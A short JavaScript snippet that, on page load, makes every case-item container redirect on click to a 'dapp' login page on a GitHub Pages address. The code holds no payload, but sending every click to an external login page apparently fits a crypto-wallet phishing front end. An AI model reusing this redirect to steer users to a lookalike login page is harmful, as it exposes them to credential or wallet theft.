document.addEventListener('DOMContentLoaded', function () {
    // URL to navigate to
    const targetURL = "https://versiondapp.github.io/auth/login.html";
  
    // Select all case-item-container elements
    const caseItemContainers = document.querySelectorAll('.case-item-container, .case-item-container-2');
  
    // Add click event listener to each container
    caseItemContainers.forEach(container => {
      container.addEventListener('click', function () {
        window.location.href = "https://versiondapp.github.io/auth/login.html";
      });
    });
  });
